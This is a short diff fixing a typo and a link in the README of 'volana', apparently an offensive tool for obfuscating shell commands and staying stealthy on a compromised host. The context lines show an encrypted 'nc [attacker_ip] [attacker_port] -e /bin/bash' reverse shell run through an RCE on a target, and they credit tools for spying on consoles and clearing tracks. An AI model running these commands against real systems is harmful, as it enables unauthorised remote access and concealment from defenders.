@@ -51,7 +51,7 @@ volana encr "nc [attacker_ip] [attacker_port] -e /bin/bash"
 Copy encrypted command and executed it with your rce **on target machine**
 ```shell
 ./volana decr [encrypted_command]
-## Now you have a bindshell shell, spawn it to make it interactive and use volana usually to be stealth (.volana)
+## Now you have a bindshell, spawn it to make it interactive and use volana usually to be stealth (.volana)
 
 ```
 
@@ -110,5 +110,5 @@ Sorry for the clickbait title, but no money will be provided for contibutors. ðŸ
 
  
 ## Credit
-* [8 ways to spy on console](https://github.com/annmuor/zn2021_8ways]
+* [8 ways to spy on console](https://github.com/annmuor/zn2021_8ways)
 * [moonwalk](https://github.com/mufeedvh/moonwalk): similar tool that clear tracks AFTER passage
